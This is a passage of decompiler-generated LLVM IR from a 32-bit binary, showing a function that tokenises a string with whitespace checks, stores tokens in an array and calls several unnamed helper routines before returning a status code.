  %v3_8051db6 = inttoptr i32 %v2_8051db6 to i32*
  store i32 %storemerge, i32* %v3_8051db6, align 4
  %v0_8051db9 = load i32, i32* @ebx, align 4
  %v1_8051db9 = add i32 %v0_8051db9, 8
  %v1_8051dbc = load i32, i32* %edx.global-to-local, align 4
  %v2_8051dbc = add i32 %v1_8051dbc, 4
  %v3_8051dbc = inttoptr i32 %v2_8051dbc to i32*
  store i32 %v1_8051db9, i32* %v3_8051dbc, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8051dc3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051dc3 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8051dc3, i32* %v2_8051dc3, align 4
  br label %dec_label_pc_8051f21

dec_label_pc_8051df1:                             ; preds = %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge, %dec_label_pc_8051d23
  %v1_8051df5.pre-phi = phi i32* [ %.pre, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v1_8051cc2, %dec_label_pc_8051d23 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v4_8051d33, %dec_label_pc_8051d23 ]
  %stack_var_-20.0.in = phi i32 [ %v1_8051cab, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v0_8051d2f, %dec_label_pc_8051d23 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v1_8051cab, %dec_label_pc_8051d23 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v0_8051d2b, %dec_label_pc_8051d23 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v0_8051d16, %dec_label_pc_8051d23 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge ], [ %v1_8051cef, %dec_label_pc_8051d23 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8051df5.pre-phi, align 4
  %v12_8051e7f = icmp eq i32 %arg4, 2
  %v2_8051eaa = inttoptr i32 %arg2 to i8*
  %v12_8051ebd = icmp eq i32 %arg3, 2
  %v12_8051edf = icmp eq i32 %arg3, 10
  %v1_8051e89 = icmp eq i1 %v12_8051e7f, false
  %v1_8051ec2 = icmp eq i1 %v12_8051ebd, false
  %v1_8051ee4 = icmp eq i1 %v12_8051edf, false
  br label %dec_label_pc_8051f07.outer

dec_label_pc_8051f07.outer:                       ; preds = %dec_label_pc_8051edf, %dec_label_pc_8051ee6, %dec_label_pc_8051ec4, %dec_label_pc_8051df1
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8051df1 ], [ 2, %dec_label_pc_8051ec4 ], [ 2, %dec_label_pc_8051ee6 ], [ 2, %dec_label_pc_8051edf ]
  br label %dec_label_pc_8051f07

dec_label_pc_8051e08:                             ; preds = %dec_label_pc_8051f07
  %v5_8051e10 = call i32 @function_8052000(i8* %stack_var_-20.0, i32 35, i32 %v3_8051f11, i32 %v3_8051f11)
  store i32 %v5_8051e10, i32* @eax, align 4
  %v1_8051e18 = icmp eq i32 %v5_8051e10, 0
  br i1 %v1_8051e18, label %dec_label_pc_8051e1f, label %dec_label_pc_8051e1c

dec_label_pc_8051e1c:                             ; preds = %dec_label_pc_8051e08
  %v1_8051e1c = inttoptr i32 %v5_8051e10 to i8*
  store i8 0, i8* %v1_8051e1c, align 1
  br label %dec_label_pc_8051e1f

dec_label_pc_8051e1f:                             ; preds = %dec_label_pc_8051e08, %dec_label_pc_8051e1c
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8051e5f34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8051e5f35 = icmp eq i8 %v2_8051e5f34, 0
  %v1_8051e6241 = icmp eq i1 %v3_8051e5f35, false
  br i1 %v1_8051e6241, label %dec_label_pc_8051e2b.preheader.preheader, label %dec_label_pc_8051e64

dec_label_pc_8051e2b.preheader.preheader:         ; preds = %dec_label_pc_8051e1f
  %v4_8051e2b98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051e2b.preheader

dec_label_pc_8051e27:                             ; preds = %dec_label_pc_8051e31
  store i8 0, i8* %v1_8051e2b104, align 1
  %v0_8051e2a = load i32, i32* @ecx, align 4
  %v1_8051e2a = add i32 %v0_8051e2a, 1
  store i32 %v1_8051e2a, i32* @ecx, align 4
  %v1_8051e2b = inttoptr i32 %v1_8051e2a to i8*
  %v2_8051e2b = load i8, i8* %v1_8051e2b, align 1
  %v3_8051e2b = zext i8 %v2_8051e2b to i32
  %v4_8051e2b = load i32, i32* %eax.global-to-local, align 4
  %v5_8051e2b = and i32 %v4_8051e2b, -256
  %v6_8051e2b = or i32 %v5_8051e2b, %v3_8051e2b
  store i32 %v6_8051e2b, i32* @eax, align 4
  %v4_8051e2d = icmp eq i8 %v2_8051e2b, 0
  br i1 %v4_8051e2d, label %dec_label_pc_8051e2b.dec_label_pc_8051e64.loopexit_crit_edge, label %dec_label_pc_8051e31

dec_label_pc_8051e31:                             ; preds = %dec_label_pc_8051e2b.preheader, %dec_label_pc_8051e27
  %v2_8051e2b105 = phi i8 [ %v2_8051e2b, %dec_label_pc_8051e27 ], [ %v2_8051e2b96, %dec_label_pc_8051e2b.preheader ]
  %v1_8051e2b104 = phi i8* [ %v1_8051e2b, %dec_label_pc_8051e27 ], [ %v1_8051e2b95, %dec_label_pc_8051e2b.preheader ]
  %v0_8051e27103 = phi i32 [ %v1_8051e2a, %dec_label_pc_8051e27 ], [ %v0_8051e2b49, %dec_label_pc_8051e2b.preheader ]
  %v2_8051e31 = sext i8 %v2_8051e2b105 to i32
  store i32 %v2_8051e31, i32* @edx, align 4
  %v0_8051e34 = load i32, i32* @global_var_8055da0, align 32
  store i32 %v0_8051e34, i32* %eax.global-to-local, align 4
  %v2_8051e39 = mul nsw i32 %v2_8051e31, 2
  %v3_8051e39 = add i32 %v0_8051e34, %v2_8051e39
  %v4_8051e39 = inttoptr i32 %v3_8051e39 to i8*
  %v5_8051e39 = load i8, i8* %v4_8051e39, align 1
  %v6_8051e39 = and i8 %v5_8051e39, 32
  %v7_8051e39 = icmp eq i8 %v6_8051e39, 0
  %v1_8051e3d = icmp eq i1 %v7_8051e39, false
  br i1 %v1_8051e3d, label %dec_label_pc_8051e27, label %dec_label_pc_8051e3f

dec_label_pc_8051e3f:                             ; preds = %dec_label_pc_8051e31
  %v0_8051e3f = load i32, i32* @edi, align 4
  %v1_8051e3f = add i32 %v0_8051e3f, -6
  %v6_8051e3f = sub i32 5, %v0_8051e3f
  %v7_8051e3f = and i32 %v6_8051e3f, %v0_8051e3f
  %v8_8051e3f = icmp slt i32 %v7_8051e3f, 0
  %v9_8051e3f = icmp eq i32 %v1_8051e3f, 0
  %v10_8051e3f = icmp slt i32 %v1_8051e3f, 0
  %v3_8051e42 = icmp eq i1 %v10_8051e3f, %v8_8051e3f
  %v4_8051e42 = icmp eq i1 %v9_8051e3f, false
  %v5_8051e42 = and i1 %v4_8051e42, %v3_8051e42
  br i1 %v5_8051e42, label %dec_label_pc_8051e4b.preheader, label %dec_label_pc_8051e44

dec_label_pc_8051e44:                             ; preds = %dec_label_pc_8051e3f
  %v1_8051e44 = load i32, i32* @ebx, align 4
  %v3_8051e44 = mul i32 %v0_8051e3f, 4
  %v4_8051e44 = add i32 %v1_8051e44, %v3_8051e44
  %v5_8051e44 = inttoptr i32 %v4_8051e44 to i32*
  store i32 %v0_8051e27103, i32* %v5_8051e44, align 4
  %v0_8051e47 = load i32, i32* @edi, align 4
  %v1_8051e47 = add i32 %v0_8051e47, 1
  store i32 %v1_8051e47, i32* @edi, align 4
  %v0_8051e4b.pre.pre = load i32, i32* @ecx, align 4
  %v4_8051e4b.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e4b.preheader

dec_label_pc_8051e4b.preheader:                   ; preds = %dec_label_pc_8051e44, %dec_label_pc_8051e3f
  %v4_8051e4b.pre = phi i32 [ %v4_8051e4b.pre.pre, %dec_label_pc_8051e44 ], [ %v0_8051e34, %dec_label_pc_8051e3f ]
  %v0_8051e4b.pre = phi i32 [ %v0_8051e4b.pre.pre, %dec_label_pc_8051e44 ], [ %v0_8051e27103, %dec_label_pc_8051e3f ]
  %v0_8051e6454 = phi i32 [ %v1_8051e47, %dec_label_pc_8051e44 ], [ %v0_8051e3f, %dec_label_pc_8051e3f ]
  %v1_8051e4b106 = inttoptr i32 %v0_8051e4b.pre to i8*
  %v2_8051e4b107 = load i8, i8* %v1_8051e4b106, align 1
  %v3_8051e4b108 = zext i8 %v2_8051e4b107 to i32
  %v5_8051e4b109 = and i32 %v4_8051e4b.pre, -256
  %v6_8051e4b110 = or i32 %v3_8051e4b108, %v5_8051e4b109
  store i32 %v6_8051e4b110, i32* @eax, align 4
  %v4_8051e4d111 = icmp eq i8 %v2_8051e4b107, 0
  br i1 %v4_8051e4d111, label %dec_label_pc_8051e5f.loopexit, label %dec_label_pc_8051e51.lr.ph

dec_label_pc_8051e51.lr.ph:                       ; preds = %dec_label_pc_8051e4b.preheader
  %v0_8051e54.pre = load i32, i32* @global_var_8055da0, align 32
  br label %dec_label_pc_8051e51

dec_label_pc_8051e4a:                             ; preds = %dec_label_pc_8051e51
  %v1_8051e4a = add i32 %v0_8051e5f113, 1
  store i32 %v1_8051e4a, i32* @ecx, align 4
  %v1_8051e4b = inttoptr i32 %v1_8051e4a to i8*
  %v2_8051e4b = load i8, i8* %v1_8051e4b, align 1
  %v3_8051e4b = zext i8 %v2_8051e4b to i32
  %v5_8051e4b = and i32 %v0_8051e54.pre, -256
  %v6_8051e4b = or i32 %v3_8051e4b, %v5_8051e4b
  store i32 %v6_8051e4b, i32* @eax, align 4
  %v4_8051e4d = icmp eq i8 %v2_8051e4b, 0
  br i1 %v4_8051e4d, label %dec_label_pc_8051e5f.loopexit, label %dec_label_pc_8051e51

dec_label_pc_8051e51:                             ; preds = %dec_label_pc_8051e51.lr.ph, %dec_label_pc_8051e4a
  %v2_8051e4b115 = phi i8 [ %v2_8051e4b107, %dec_label_pc_8051e51.lr.ph ], [ %v2_8051e4b, %dec_label_pc_8051e4a ]
  %v1_8051e4b114 = phi i8* [ %v1_8051e4b106, %dec_label_pc_8051e51.lr.ph ], [ %v1_8051e4b, %dec_label_pc_8051e4a ]
  %v0_8051e5f113 = phi i32 [ %v0_8051e4b.pre, %dec_label_pc_8051e51.lr.ph ], [ %v1_8051e4a, %dec_label_pc_8051e4a ]
  %v2_8051e51 = sext i8 %v2_8051e4b115 to i32
  store i32 %v2_8051e51, i32* @edx, align 4
  store i32 %v0_8051e54.pre, i32* @eax, align 4
  %v2_8051e59 = mul nsw i32 %v2_8051e51, 2
  %v3_8051e59 = add i32 %v0_8051e54.pre, %v2_8051e59
  %v4_8051e59 = inttoptr i32 %v3_8051e59 to i8*
  %v5_8051e59 = load i8, i8* %v4_8051e59, align 1
  %v6_8051e59 = and i8 %v5_8051e59, 32
  %v7_8051e59 = icmp eq i8 %v6_8051e59, 0
  br i1 %v7_8051e59, label %dec_label_pc_8051e4a, label %dec_label_pc_8051e5f.loopexit

dec_label_pc_8051e5f.loopexit:                    ; preds = %dec_label_pc_8051e51, %dec_label_pc_8051e4a, %dec_label_pc_8051e4b.preheader
  %v4_8051e2b98135 = phi i32 [ %v6_8051e4b110, %dec_label_pc_8051e4b.preheader ], [ %v6_8051e4b, %dec_label_pc_8051e4a ], [ %v0_8051e54.pre, %dec_label_pc_8051e51 ]
  %v0_8051e5f.lcssa = phi i32 [ %v0_8051e4b.pre, %dec_label_pc_8051e4b.preheader ], [ %v1_8051e4a, %dec_label_pc_8051e4a ], [ %v0_8051e5f113, %dec_label_pc_8051e51 ]
  %v1_8051e4b.lcssa = phi i8* [ %v1_8051e4b106, %dec_label_pc_8051e4b.preheader ], [ %v1_8051e4b, %dec_label_pc_8051e4a ], [ %v1_8051e4b114, %dec_label_pc_8051e51 ]
  %v2_8051e5f = load i8, i8* %v1_8051e4b.lcssa, align 1
  %v3_8051e5f = icmp eq i8 %v2_8051e5f, 0
  %v1_8051e62 = icmp eq i1 %v3_8051e5f, false
  br i1 %v1_8051e62, label %dec_label_pc_8051e2b.preheader, label %dec_label_pc_8051e64

dec_label_pc_8051e2b.preheader:                   ; preds = %dec_label_pc_8051e2b.preheader.preheader, %dec_label_pc_8051e5f.loopexit
  %v0_8051e64.pre138 = phi i32 [ %v0_8051e6454, %dec_label_pc_8051e5f.loopexit ], [ 0, %dec_label_pc_8051e2b.preheader.preheader ]
  %v4_8051e2b98 = phi i32 [ %v4_8051e2b98135, %dec_label_pc_8051e5f.loopexit ], [ %v4_8051e2b98.pre, %dec_label_pc_8051e2b.preheader.preheader ]
  %v0_8051e2b49 = phi i32 [ %v0_8051e5f.lcssa, %dec_label_pc_8051e5f.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8051e2b.preheader.preheader ]
  %v1_8051e2b95 = inttoptr i32 %v0_8051e2b49 to i8*
  %v2_8051e2b96 = load i8, i8* %v1_8051e2b95, align 1
  %v3_8051e2b97 = zext i8 %v2_8051e2b96 to i32
  %v5_8051e2b99 = and i32 %v4_8051e2b98, -256
  %v6_8051e2b100 = or i32 %v5_8051e2b99, %v3_8051e2b97
  store i32 %v6_8051e2b100, i32* @eax, align 4
  %v4_8051e2d101 = icmp eq i8 %v2_8051e2b96, 0
  br i1 %v4_8051e2d101, label %dec_label_pc_8051e64, label %dec_label_pc_8051e31

dec_label_pc_8051e2b.dec_label_pc_8051e64.loopexit_crit_edge: ; preds = %dec_label_pc_8051e27
  %v0_8051e64.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051e64

dec_label_pc_8051e64:                             ; preds = %dec_label_pc_8051e5f.loopexit, %dec_label_pc_8051e2b.dec_label_pc_8051e64.loopexit_crit_edge, %dec_label_pc_8051e2b.preheader, %dec_label_pc_8051e1f
  %v1_8051e67 = phi i32 [ 0, %dec_label_pc_8051e1f ], [ %v0_8051e64.pre.pre, %dec_label_pc_8051e2b.dec_label_pc_8051e64.loopexit_crit_edge ], [ %v0_8051e64.pre138, %dec_label_pc_8051e2b.preheader ], [ %v0_8051e6454, %dec_label_pc_8051e5f.loopexit ]
  %v0_8051e67 = load i32, i32* @ebx, align 4
  %v2_8051e67 = mul i32 %v1_8051e67, 4
  %v3_8051e67 = add i32 %v0_8051e67, %v2_8051e67
  %v4_8051e67 = inttoptr i32 %v3_8051e67 to i32*
  store i32 0, i32* %v4_8051e67, align 4
  %v7_8051e6e = icmp sgt i32 %v1_8051e67, 1
  br i1 %v7_8051e6e, label %dec_label_pc_8051e74, label %dec_label_pc_8051f07

dec_label_pc_8051e74:                             ; preds = %dec_label_pc_8051e64
  br i1 %v12_8051ca6, label %dec_label_pc_8051f41, label %dec_label_pc_8051e7f

dec_label_pc_8051e7f:                             ; preds = %dec_label_pc_8051e74
  store i32 1, i32* @esi, align 4
  br i1 %v1_8051e89, label %dec_label_pc_8051eb7.preheader, label %dec_label_pc_8051e8b

dec_label_pc_8051eb7.preheader:                   ; preds = %dec_label_pc_8051e7f
  %v1_8051eb7119 = load i32, i32* @edi, align 4
  %v5_8051eb9124 = icmp sgt i32 %v1_8051eb7119, 1
  br i1 %v5_8051eb9124, label %dec_label_pc_8051ea1.lr.ph, label %dec_label_pc_8051f07

dec_label_pc_8051ea1.lr.ph:                       ; preds = %dec_label_pc_8051eb7.preheader
  br label %dec_label_pc_8051ea1

dec_label_pc_8051e8b:                             ; preds = %dec_label_pc_8051e7f
  %v0_8051e8b = load i32, i32* @eax, align 4
  %v0_8051e8d = load i32, i32* @ebx, align 4
  %v1_8051e8d = inttoptr i32 %v0_8051e8d to i32*
  %v2_8051e8d = load i32, i32* %v1_8051e8d, align 4
  %v5_8051e93 = call i32 @function_8051364(i8* %v2_8051eaa, i32 %v2_8051e8d, i32 %v0_8051e8b, i32 %v0_8051e8b)
  store i32 %v5_8051e93, i32* %eax.global-to-local, align 4
  %v1_8051e9b = icmp eq i32 %v5_8051e93, 0
  %v1_8051e9d = icmp eq i1 %v1_8051e9b, false
  br i1 %v1_8051e9d, label %dec_label_pc_8051f07, label %dec_label_pc_8051ebd

dec_label_pc_8051ea1:                             ; preds = %dec_label_pc_8051ea1.lr.ph, %dec_label_pc_8051eb6
  %v1_8051ea3125 = phi i32 [ 1, %dec_label_pc_8051ea1.lr.ph ], [ %v1_8051eb6, %dec_label_pc_8051eb6 ]
  %v0_8051ea3 = load i32, i32* @ebx, align 4
  %v2_8051ea3 = mul i32 %v1_8051ea3125, 4
  %v3_8051ea3 = add i32 %v0_8051ea3, %v2_8051ea3
  %v4_8051ea3 = inttoptr i32 %v3_8051ea3 to i32*
  %v5_8051ea3 = load i32, i32* %v4_8051ea3, align 4
  %v3_8051eaa = call i32 @function_804d34c(i8* %v2_8051eaa, i32 %v5_8051ea3)
  store i32 %v3_8051eaa, i32* %eax.global-to-local, align 4
  %v1_8051eb2 = icmp eq i32 %v3_8051eaa, 0
  br i1 %v1_8051eb2, label %dec_label_pc_8051ebd, label %dec_label_pc_8051eb6

dec_label_pc_8051eb6:                             ; preds = %dec_label_pc_8051ea1
  %v0_8051eb6 = load i32, i32* @esi, align 4
  %v1_8051eb6 = add i32 %v0_8051eb6, 1
  store i32 %v1_8051eb6, i32* @esi, align 4
  %v1_8051eb7 = load i32, i32* @edi, align 4
  %v5_8051eb9 = icmp slt i32 %v1_8051eb6, %v1_8051eb7
  br i1 %v5_8051eb9, label %dec_label_pc_8051ea1, label %dec_label_pc_8051f07

dec_label_pc_8051ebd:                             ; preds = %dec_label_pc_8051e8b, %dec_label_pc_8051ea1
  br i1 %v1_8051ec2, label %dec_label_pc_8051edf, label %dec_label_pc_8051ec4

dec_label_pc_8051ec4:                             ; preds = %dec_label_pc_8051ebd
  %v0_8051ec4 = load i32, i32* @esi, align 4
  %v3_8051ec5 = load i8*, i8** %stack_var_-44, align 4
  %v4_8051ec5 = ptrtoint i8* %v3_8051ec5 to i32
  %v0_8051ec9 = load i32, i32* @ebx, align 4
  %v1_8051ec9 = inttoptr i32 %v0_8051ec9 to i32*
  %v2_8051ec9 = load i32, i32* %v1_8051ec9, align 4
  %v4_8051ecd = inttoptr i32 %v2_8051ec9 to i8*
  %v5_8051ecd = call i32 @function_80514d2(i32 2, i8* %v4_8051ecd, i32 %v4_8051ec5, i32 %v0_8051ec4)
  store i32 %v5_8051ecd, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8051ecd, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8051d5d, label %dec_label_pc_8051f07.outer

dec_label_pc_8051edf:                             ; preds = %dec_label_pc_8051ebd
  br i1 %v1_8051ee4, label %dec_label_pc_8051f07.outer, label %dec_label_pc_8051ee6

dec_label_pc_8051ee6:                             ; preds = %dec_label_pc_8051edf
  %v0_8051ee6 = load i32, i32* @ecx, align 4
  %v0_8051eeb = load i32, i32* @ebx, align 4
  %v1_8051eeb = inttoptr i32 %v0_8051eeb to i32*
  %v2_8051eeb = load i32, i32* %v1_8051eeb, align 4
  %v4_8051eef = inttoptr i32 %v2_8051eeb to i8*
  %v5_8051eef = call i32 @function_80514d2(i32 10, i8* %v4_8051eef, i32 %stack_var_-36.0, i32 %v0_8051ee6)
  store i32 %v5_8051eef, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8051eef, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8051d8a, label %dec_label_pc_8051f07.outer

dec_label_pc_8051f07:                             ; preds = %dec_label_pc_8051eb7.preheader, %dec_label_pc_8051eb6, %dec_label_pc_8051e64, %dec_label_pc_8051e8b, %dec_label_pc_8051f07.outer
  %v0_8051f07 = load i32, i32* @edx, align 4
  %v3_8051f11 = call i32 @function_804cca8(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8051f07)
  store i32 %v3_8051f11, i32* @eax, align 4
  %v1_8051f19 = icmp eq i32 %v3_8051f11, 0
  %v1_8051f1b = icmp eq i1 %v1_8051f19, false
  br i1 %v1_8051f1b, label %dec_label_pc_8051e08, label %dec_label_pc_8051f21

dec_label_pc_8051f21:                             ; preds = %dec_label_pc_8051f07, %dec_label_pc_8051db6
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8051db6 ], [ %stack_var_-28.0.ph, %dec_label_pc_8051f07 ]
  br i1 %v12_8051ca6, label %dec_label_pc_8051f41, label %dec_label_pc_8051f28

dec_label_pc_8051f28:                             ; preds = %dec_label_pc_8051f21
  %v1_8051f2f = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8051f2f = call i32 @function_804b7fc(i16* %v1_8051f2f)
  store i32 %v2_8051f2f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f41

dec_label_pc_8051f41:                             ; preds = %dec_label_pc_8051e74, %dec_label_pc_8051c91, %dec_label_pc_8051c9d, %dec_label_pc_8051cbb, %dec_label_pc_8051cce, %dec_label_pc_8051cda, %dec_label_pc_8051ce3, %dec_label_pc_8051d0d, %dec_label_pc_8051f21, %dec_label_pc_8051f28, %dec_label_pc_8051d43
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8051f21 ], [ %stack_var_-28.1, %dec_label_pc_8051f28 ], [ %v2_8051d52, %dec_label_pc_8051d43 ], [ 34, %dec_label_pc_8051d0d ], [ 34, %dec_label_pc_8051ce3 ], [ 34, %dec_label_pc_8051cda ], [ 34, %dec_label_pc_8051cce ], [ 34, %dec_label_pc_8051cbb ], [ 34, %dec_label_pc_8051c9d ], [ 34, %dec_label_pc_8051c91 ], [ %stack_var_-28.0.ph, %dec_label_pc_8051e74 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8051c7c, i32* @ebx, align 4
  store i32 %v0_8051c7b, i32* @esi, align 4
  store i32 %v0_8051c7a, i32* @edi, align 4
  store i32 %v0_8051c79, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_8051f11, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8051eb6, { 0, 2, 1 }
  uselistorder i32 %v1_8051e67, { 1, 0 }
  uselistorder i8 %v2_8051e2b96, { 1, 2, 0 }
  uselistorder i8* %v1_8051e2b95, { 1, 0 }
  uselistorder i32 %v0_8051e2b49, { 1, 0 }
  uselistorder i32 %v2_8051e51, { 1, 0 }
  uselistorder i32 %v1_8051e4a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051e54.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8051e3f, { 1, 0 }
  uselistorder i32 %v0_8051e3f, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8051e31, { 1, 0 }
  uselistorder i8* %v2_8051eaa, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8051cef, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8051cce, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051cab, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8051cb2, { 1, 0 }
  uselistorder i32 %v1_8051c8c, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 0, 1, 14, 15, 16 }
  uselistorder i32 (i16*)* @function_804b7fc, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @function_804cca8, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_804d34c, { 3, 0, 1, 2 }
  uselistorder i32 5, { 10, 13, 14, 15, 0, 9, 4, 5, 12, 6, 16, 17, 7, 2, 3, 18, 11, 19, 20, 8, 1 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 10, 11, 12, 13, 14, 18, 0, 5, 19, 7, 8, 9, 6, 15, 20, 21, 16, 17, 1, 2, 3, 4 }
  uselistorder i32* @global_var_8055da0, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 10, { 14, 0, 23, 24, 25, 26, 27, 28, 1, 11, 15, 2, 7, 29, 8, 9, 10, 16, 3, 19, 20, 21, 12, 30, 17, 13, 4, 5, 6, 22, 18 }
  uselistorder i32 12, { 37, 38, 39, 0, 40, 17, 26, 1, 47, 52, 21, 20, 7, 6, 8, 9, 10, 11, 12, 13, 14, 48, 86, 87, 88, 89, 90, 91, 92, 93, 2, 18, 19, 94, 95, 96, 101, 25, 27, 32, 51, 28, 29, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 22, 85, 41, 42, 43, 44, 102, 45, 97, 3, 4, 98, 99, 15, 16, 100, 5, 49, 50, 23, 24, 30, 31, 33, 34, 35, 36, 46 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 4, 3 }
  uselistorder i32 56, { 4, 15, 5, 0, 6, 7, 8, 9, 2, 11, 10, 12, 3, 1, 16, 13, 14 }
  uselistorder i32 44, { 4, 5, 6, 2, 0, 16, 17, 18, 7, 1, 13, 15, 14, 10, 11, 12, 8, 9, 3 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 1, 2, 14, 15, 3, 16, 17, 18, 19 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 9, 10, 11, 0, 7, 4, 1, 8, 5, 6, 13, 14, 15, 16, 3, 2, 12 }
  uselistorder i32 -48, { 1, 2, 3, 0, 4 }
  uselistorder i32 16, { 39, 38, 0, 40, 41, 10, 5, 42, 11, 80, 90, 91, 43, 44, 45, 46, 47, 48, 55, 49, 50, 51, 52, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 81, 82, 83, 84, 92, 93, 94, 95, 96, 97, 98, 99, 119, 12, 13, 27, 21, 34, 28, 29, 33, 30, 123, 88, 2, 1, 89, 4, 3, 66, 67, 16, 6, 17, 8, 14, 124, 68, 69, 70, 71, 72, 73, 85, 86, 74, 75, 76, 77, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 22, 115, 116, 117, 118, 120, 121, 122, 87, 9, 7, 23, 31, 32, 18, 19, 20, 35, 36, 37, 15, 78, 24, 79, 26, 25 }
  uselistorder i32 8, { 56, 55, 57, 0, 1, 58, 59, 60, 61, 62, 63, 6, 64, 2, 13, 69, 70, 71, 72, 30, 73, 129, 33, 15, 16, 17, 18, 34, 19, 20, 35, 36, 21, 37, 22, 38, 39, 74, 130, 131, 132, 133, 134, 135, 32, 31, 136, 137, 138, 139, 159, 160, 161, 162, 26, 167, 27, 168, 28, 43, 23, 45, 50, 82, 46, 47, 83, 84, 85, 86, 87, 88, 89, 7, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 8, 100, 101, 102, 103, 104, 41, 9, 42, 10, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 40, 122, 123, 11, 124, 125, 126, 127, 12, 128, 65, 66, 3, 14, 29, 166, 140, 67, 75, 76, 4, 5, 44, 141, 142, 143, 144, 146, 147, 148, 145, 149, 150, 151, 152, 24, 25, 153, 154, 155, 156, 157, 158, 163, 164, 165, 77, 78, 79, 80, 48, 49, 81, 51, 52, 53, 54, 68 }
  uselistorder i32 -32, { 2, 0, 1 }
  uselistorder i32 32, { 30, 0, 31, 32, 17, 19, 3, 27, 4, 5, 6, 7, 8, 33, 18, 34, 35, 36, 22, 23, 41, 54, 20, 26, 28, 29, 10, 9, 11, 12, 24, 13, 1, 37, 38, 39, 42, 43, 2, 44, 45, 46, 47, 48, 49, 50, 14, 51, 25, 52, 53, 40, 21, 16, 15 }
